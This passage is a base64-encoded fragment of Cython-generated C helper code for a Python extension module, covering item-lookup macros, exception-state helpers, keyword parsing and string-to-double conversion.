gYnVpbGRlciwgYXJncywgbikgUHlEaWN0X1NldEl0ZW0oYnVpbGRlciwga2V5LCB2YWx1ZSlcbiNkZWZpbmUgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGtleSwgdmFsdWUsIGJ1aWxkZXIsIGFyZ3MsIG4pIFB5RGljdF9TZXRJdGVtU3RyaW5nKGJ1aWxkZXIsIGtleSwgdmFsdWUpXG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoUHlPYmplY3QgKm9iaik7XG5cblxuI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50KG8sIGksIHR5cGUsIGlzX3NpZ25lZCwgdG9fcHlfZnVuYywgaXNfbGlzdCwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIGhhc19naWwpXFxcbiAgICAoX19QeXhfZml0c19QeV9zc2l6ZV90KGksIHR5cGUsIGlzX3NpZ25lZCkgP1xcXG4gICAgX19QeXhfR2V0SXRlbUludF9GYXN0KG8sIChQeV9zc2l6ZV90KWksIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrKSA6XFxcbiAgICAoaXNfbGlzdCA/IChQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW5kZXhFcnJvciwgImxpc3QgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkgOlxcXG4gICAgICAgICAgICAgICBfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMobywgdG9fcHlfZnVuYyhpKSkpKVxuI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50X0xpc3QobywgaSwgdHlwZSwgaXNfc2lnbmVkLCB0b19weV9mdW5jLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaywgaGFzX2dpbClcXFxuICAgIChfX1B5eF9maXRzX1B5X3NzaXplX3QoaSwgdHlwZSwgaXNfc2lnbmVkKSA/XFxcbiAgICBfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChvLCAoUHlfc3NpemVfdClpLCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlxcXG4gICAgKFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbmRleEVycm9yLCAibGlzdCBpbmRleCBvdXQgb2YgcmFuZ2UiKSwgKFB5T2JqZWN0KilOVUxMKSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgd3JhcGFyb3VuZCwgaW50IGJvdW5kc2NoZWNrKTtcbiNkZWZpbmUgX19QeXhfR2V0SXRlbUludF9UdXBsZShvLCBpLCB0eXBlLCBpc19zaWduZWQsIHRvX3B5X2Z1bmMsIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrLCBoYXNfZ2lsKVxcXG4gICAgKF9fUHl4X2ZpdHNfUHlfc3NpemVfdChpLCB0eXBlLCBpc19zaWduZWQpID9cXFxuICAgIF9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChvLCAoUHlfc3NpemVfdClpLCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlxcXG4gICAgKFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbmRleEVycm9yLCAidHVwbGUgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9UdXBsZV9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMoUHlPYmplY3QgKm8sIFB5T2JqZWN0KiBqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX2xpc3QsIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spO1xuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9HZXRJdGVtKFB5T2JqZWN0ICpkLCBQeU9iamVjdCoga2V5KTtcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKG9iaiwgbmFtZSlcXFxuICAgIChsaWtlbHkoUHlEaWN0X0NoZWNrRXhhY3Qob2JqKSkgP1xcXG4gICAgIF9fUHl4X1B5RGljdF9HZXRJdGVtKG9iaiwgbmFtZSkgOiBQeU9iamVjdF9HZXRJdGVtKG9iaiwgbmFtZSkpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbShkLCBrZXkpIFB5T2JqZWN0X0dldEl0ZW0oZCwga2V5KVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0ob2JqLCBuYW1lKSAgUHlPYmplY3RfR2V0SXRlbShvYmosIG5hbWUpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsTm9FcnJvcihvYmosIGF0dHJfbmFtZSkgIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lLCAwKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lKSAgX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwob2JqLCBhdHRyX25hbWUsIDEpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgaW50IHdpdGhfZXJyb3IpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbE5vRXJyb3IobyxuKSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihvLG4pXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwobyxuKSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG8sbilcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKiBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSk7XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblNhdmUodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblNhdmUoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25TYXZlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTtcbiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uUmVzZXQodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uU2F2ZSh0eXBlLCB2YWx1ZSwgdGIpICAgUHlFcnJfR2V0RXhjSW5mbyh0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblJlc2V0KHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1NldEV4Y0luZm8odHlwZSwgdmFsdWUsIHRiKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuI2RlZmluZSBfX1B5eF9FeGNlcHRpb25Td2FwKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19FeGNlcHRpb25Td2FwKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FeGNlcHRpb25Td2FwKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoY29uc3QgY2hhciogZnVuY19uYW1lLCBQeU9iamVjdCoga3dfbmFtZSk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1BhcnNlS2V5d29yZHMoXG4gICAgUHlPYmplY3QgKmt3ZHMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLCBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsIFB5X3NzaXplX3QgbnVtX2t3YXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLFxuICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3Ncbik7XG5cblxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKVxcXG4gICAgKChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoY2Z1bmMpLT5mdW5jKShzZWxmLCBhcmdzKVxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uV2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCBrd2FyZ3MpXFxcbiAgICAoKFB5Q0Z1bmN0aW9uV2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MsIGt3YXJncylcbiNkZWZpbmUgX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIG5hcmdzKVxcXG4gICAgKChfX1B5eF9QeUNGdW5jdGlvbkZhc3QpKHZvaWQoKikodm9pZCkpKFB5Q0Z1bmN0aW9uKShjZnVuYyktPmZ1bmMpKHNlbGYsIGFyZ3MsIG5hcmdzKVxuI2RlZmluZSBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpXFxcbiAgICAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSkoUHlDRnVuY3Rpb24pKGNmdW5jKS0+ZnVuYykoc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpXG5cblxudHlwZWRlZiBzdHJ1Y3Qge1xuICAgIFB5T2JqZWN0ICp0eXBlO1xuICAgIFB5T2JqZWN0ICoqbWV0aG9kX25hbWU7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgJiYgQ1lUSE9OX0FUT01JQ1NcbiAgICBfX3B5eF9hdG9taWNfaW50X3R5cGUgaW5pdGlhbGl6ZWQ7XG4jZW5kaWZcbiAgICBQeUNGdW5jdGlvbiBmdW5jO1xuICAgIFB5T2JqZWN0ICptZXRob2Q7XG4gICAgaW50IGZsYWc7XG59IF9fUHl4X0NhY2hlZENGdW5jdGlvbjtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYykge1xuI2lmICFDWVRIT05fQVRPTUlDU1xuICAgIHJldHVybiAxO1xuI2Vsc2VcbiAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgZXhwZWN0ZWQgPSAwO1xuICAgIGlmIChfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSgmY2Z1bmMtPmluaXRpYWxpemVkLCAmZXhwZWN0ZWQsIDEpKSB7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICByZXR1cm4gZXhwZWN0ZWQ7XG4jZW5kaWZcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX1NldEZpbmlzaGVkSW5pdGlhbGl6aW5nKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMpIHtcbiNpZiBDWVRIT05fQVRPTUlDU1xuICAgIF9fcHl4X2F0b21pY19zdG9yZSgmY2Z1bmMtPmluaXRpYWxpemVkLCAyKTtcbiNlbmRpZlxufVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX0dldEFuZFNldEluaXRpYWxpemluZyhjZnVuYykgMlxuI2RlZmluZSBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fU2V0RmluaXNoZWRJbml0aWFsaXppbmcoY2Z1bmMpXG4jZW5kaWZcblxuXG5DWVRIT05fVU5VU0VEXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogY2Z1bmMsIFB5T2JqZWN0KiBzZWxmLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcxLCBQeU9iamVjdCAqYXJnMik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKSAgX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpXG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZChjb25zdCBjaGFyKiBmdW5jX25hbWUsIGludCBleGFjdCxcbiAgICBQeV9zc2l6ZV90IG51bV9taW4sIFB5X3NzaXplX3QgbnVtX21heCwgUHlfc3NpemVfdCBudW1fZm91bmQpO1xuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnR2YWwsIGlucGxhY2UsIHplcm9kaXZpc2lvbl9jaGVjaylcXFxuICAgIChpbnBsYWNlID8gUHlOdW1iZXJfSW5QbGFjZUFkZChvcDEsIG9wMikgOiBQeU51bWJlcl9BZGQob3AxLCBvcDIpKVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpO1xuXG5cbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21CSW50X2JpbnQodmFsdWUpXFxcbiAgICAoKHZhbHVlKSA/IF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVHJ1ZSkgOiBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0ZhbHNlKSlcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKFB5T2JqZWN0KiBpdGVtLCBQeU9iamVjdCogc2VxLCBpbnQgZXEpIHtcbiAgICBpbnQgcmVzdWx0ID0gUHlTZXF1ZW5jZV9Db250YWlucyhzZXEsIGl0ZW0pO1xuICAgIHJldHVybiB1bmxpa2VseShyZXN1bHQgPCAwKSA/IHJlc3VsdCA6IChyZXN1bHQgPT0gKGVxID09IFB5X0VRKSk7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcihQeV9zc2l6ZV90IGV4cGVjdGVkKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihQeV9zc2l6ZV90IGluZGV4KTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXRlckZpbmlzaCh2b2lkKTtcblxuXG5zdGF0aWMgaW50IF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soUHlPYmplY3QgKnJldHZhbCwgUHlfc3NpemVfdCBleHBlY3RlZCk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9Db250YWluc1RGKFB5T2JqZWN0KiBzdWJzdHJpbmcsIFB5T2JqZWN0KiB0ZXh0LCBpbnQgZXEpIHtcbiAgICBpbnQgcmVzdWx0ID0gUHlVbmljb2RlX0NvbnRhaW5zKHRleHQsIHN1YnN0cmluZyk7XG4gICAgcmV0dXJuIHVubGlrZWx5KHJlc3VsdCA8IDApID8gcmVzdWx0IDogKHJlc3VsdCA9PSAoZXEgPT0gUHlfRVEpKTtcbn1cblxuXG5zdGF0aWMgZG91YmxlIF9fUHl4X1Nsb3dQeVN0cmluZ19Bc0RvdWJsZShQeU9iamVjdCAqb2JqKTtcbnN0YXRpYyBkb3VibGUgX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGUoUHlPYmplY3QgKm9iaiwgY29uc3QgY2hhciogc3RhcnQsIFB5X3NzaXplX3QgbGVuZ3RoKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGRvdWJsZSBfX1B5eF9QeUJ5dGVzX0FzRG91YmxlKFB5T2JqZWN0ICpvYmopIHtcbiAgICBjaGFyKiBhc19jX3N0cmluZztcbiAgICBQeV9zc2l6ZV90IHNpemU7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIGFzX2Nfc3RyaW5nID0gUHlCeXRlc19BU19TVFJJTkcob2JqKTtcbiAgICBzaXplID0gUHlCeXRlc19HRVRfU0laRShvYmopO1xuI2Vsc2VcbiAgICBpZiAoUHlCeXRlc19Bc1N0cmluZ0FuZFNpemUob2JqLCAmYXNfY19zdHJpbmcsICZzaXplKSA8IDApIHtcbiAgICAgICAgcmV0dXJuIChkb3VibGUpLTE7XG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlKG9iaiwgYXNfY19zdHJpbmcsIHNpemUpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgZG91YmxlIF9fUHl4X1B5Qnl0ZUFycmF5X0FzRG91YmxlKFB5T2JqZWN0ICpvYmopIHtcbiAgICBjaGFyKiBhc19jX3N0cmluZztcbiAgICBQeV9zc2l6ZV90IHNpemU7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIGFzX2Nfc3RyaW5nID0gUHlCeXRlQXJyYXlfQVNfU1RSSU5HKG9iaik7XG4gICAgc2l6ZSA9IFB5Qnl0ZUFycmF5X0dFVF9TSVpFKG9iaik7XG4jZWxzZVxuICAgIGFzX2Nfc3RyaW5nID0gUHlCeXRlQXJyYXlfQXNTdHJpbmcob2JqKTtcbiAgICBpZiAoYXNfY19zdHJpbmcgPT0gTlVMTCkge1xuICAgICAgICByZXR1cm4gKGRvdWJsZSktMTtcbiAgICB9XG4gICAgc2l6ZSA9IFB5Qnl0ZUFycmF5X1NpemUob2JqKTtcbiNlbmRpZlxuICAgIHJldHVybiBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZShvYmosIGFzX2Nfc3RyaW5nLCBzaXplKTtcbn1cblxuXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG5zdGF0aWMgY29uc3QgY2hhciogX19QeXhfX1B5VW5pY29kZV9Bc0RvdWJsZV9Db3B5KGNvbnN0IHZvaWQqIGRhdGEsIGNvbnN0IGludCBraW5kLCBjaGFyKiBidWZmZXIsIFB5X3NzaXplX3Qgc3RhcnQsIFB5X3NzaXplX3QgZW5kKSB7XG4gICAgaW50IGxhc3Rfd2FzX3B1bmN0dWF0aW9uO1xuICAgIFB5X3NzaXplX3QgaTtcbiAgICBsYXN0X3dhc19wdW5jdHVhdGlvbiA9IDE7XG4gICAgZm9yIChpPXN0YXJ0OyBpIDw9IGVuZDsgaSsrKSB7XG4gICAgICAgIFB5X1VDUzQgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgaSk7XG4gICAgICAgIGludCBpc19wdW5jdHVhdGlvbiA9IChjaHIgPT0gXCdfXCcpIHwgKGNociA9PSBcJy5cJyk7XG4gICAgICAgICpidWZmZXIgPSAoY2hhciljaHI7XG4gICAgICAgIGJ1ZmZlciArPSAoY2hyICE9IFwnX1wnKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGNociA+IDEyNykpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGxhc3Rfd2FzX3B1bmN0dWF0aW9uICYgaXNfcHVuY3R1YXRpb24pKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgIGxhc3Rfd2FzX3B1bmN0dWF0aW9uID0gaXNfcHVuY3R1YXRpb247XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShsYXN0X3dhc19wdW5jdHVhdGlvbikpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICAqYnVmZmVyID0gXCdcXDBcJztcbiAgICByZXR1cm4gYnVmZmVyO1xucGFyc2VfZmFpbHVyZTpcbiAgICByZXR1cm4gTlVMTDtcbn1cbnN0YXRpYyBkb3VibGUgX19QeXhfX1B5VW5pY29kZV9Bc0RvdWJsZV9pbmZfbmFuKGNvbnN0IHZvaWQqIGRhdGEsIGludCBraW5kLCBQeV9zc2l6ZV90IHN0YXJ0LCBQeV9zc2l6ZV90IGxlbmd0aCkge1xuICAgIGludCBtYXRjaGVzID0gMTtcbiAgICBQeV9VQ1M0IGNocjtcbiAgICBQeV9VQ1M0IHNpZ24gPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCk7XG4gICAgaW50IGlzX3NpZ25lZCA9IChzaWduID09IFwnLVwnKSB8IChzaWduID09IFwnK1wnKTtcbiAgICBzdGFydCArPSBpc19zaWduZWQ7XG4gICAgbGVuZ3RoIC09IGlzX3NpZ25lZDtcbiAgICBzd2l0Y2ggKFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KSkge1xuICAgICAgICAjaWZkZWYgUHlfTkFOXG4gICAgICAgIGNhc2UgXCduXCc6XG4gICAgICAgIGNhc2UgXCdOXCc6XG4gICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoICE9IDMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgICAgICBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCsxKTtcbiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSBcJ2FcJykgfCAoY2hyID09IFwnQVwnKTtcbiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzIpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09IFwnblwnKSB8IChjaHIgPT0gXCdOXCcpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtYXRjaGVzKSkgZ290byBwYXJzZV9mYWlsdXJlO1xuICAgICAgICAgICAgcmV0dXJuIChzaWduID09IFwnLVwnKSA/IC1QeV9OQU4gOiBQeV9OQU47XG4gICAgICAgICNlbmRpZlxuICAgICAgICBjYXNlIFwnaVwnOlxuICAgICAgICBjYXNlIFwnSVwnOlxuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aCA8IDMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgICAgICBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCsxKTtcbiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSBcJ25cJykgfCAoY2hyID09IFwnTlwnKTtcbiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzIpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09IFwnZlwnKSB8IChjaHIgPT0gXCdGXCcpO1xuICAgICAgICAgICAgaWYgKGxpa2VseShsZW5ndGggPT0gMyAmJiBtYXRjaGVzKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gXCctXCcpID8gLVB5X0hVR0VfVkFMIDogUHlfSFVHRV9WQUw7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoICE9IDgpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgICAgICAgICBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCszKTtcbiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSBcJ2lcJykgfCAoY2hyID09IFwnSVwnKTtcbiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzQpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09IFwnblwnKSB8IChjaHIgPT0gXCdOXCcpO1xuICAgICAgICAgICAgY2hyID0gUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQrNSk7XG4gICAgICAgICAgICBtYXRjaGVzICY9IChjaHIgPT0gXCdpXCcpIHwgKGNociA9PSBcJ0lcJyk7XG4gICAgICAgICAgICBjaHIgPSBQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBzdGFydCs2KTtcbiAgICAgICAgICAgIG1hdGNoZXMgJj0gKGNociA9PSBcJ3RcJykgfCAoY2hyID09IFwnVFwnKTtcbiAgICAgICAgICAgIGNociA9IFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KzcpO1xuICAgICAgICAgICAgbWF0Y2hlcyAmPSAoY2hyID09IFwneVwnKSB8IChjaHIgPT0gXCdZXCcpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtYXRjaGVzKSkgZ290byBwYXJzZV9mYWlsdXJlO1xu